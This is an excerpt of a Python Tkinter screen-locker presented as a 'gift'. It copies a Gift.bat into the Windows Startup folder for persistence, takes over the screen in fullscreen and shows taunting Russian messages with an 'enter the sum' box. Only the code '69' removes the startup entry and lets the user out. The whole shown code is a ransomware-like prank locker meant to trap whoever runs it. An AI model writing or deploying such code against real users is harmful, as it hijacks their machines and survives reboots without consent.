...
def add_to_startup(file_path=""):
    ...
    with open(bat_path + '\\' + "Gift.bat", "w+") as bat_file:
...
def clicked():
    ...
    if res == '69':
        ...
        file_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Gift.bat' % USER_NAME
        os.remove(file_path)
        sys.exit()


add_to_startup("gift.py")
fullscreen()

txt_one = Label(window, text='Это подарок',
                font=("Arial Bold", fontsizeHding), fg='red', bg='black')
txt_two = Label(window, text='Наслаждайся',
                font=("Arial Bold", fontsizeHding), fg='red', bg='black')
txt_three = Label(window,
                  text='Сколько букв и символов будет в этой строчке????  ааа????  ну же?????',
...
txt_three.place(relx=.01, rely=.6)

txt = Entry(window)
btn = Button(window, text="ВВОД СУММЫ", command=clicked)
